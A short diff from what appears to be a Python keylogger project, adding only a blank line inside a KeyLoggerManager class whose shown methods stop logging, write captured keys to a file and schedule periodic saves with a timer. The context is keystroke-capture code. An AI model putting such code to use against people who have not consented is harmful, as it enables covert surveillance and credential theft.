@@ -27,6 +27,7 @@ class KeyLoggerManager:
         self.service.stop_logging()
         self._write_keys_to_file()
 
+
     def _schedule_next_write(self):
         print("next save in :",self.interval - int(datetime.datetime.now().strftime('%S')),"sec")
         threading.Timer(self.interval - int(datetime.datetime.now().strftime('%S')), self._write_keys_to_file).start()
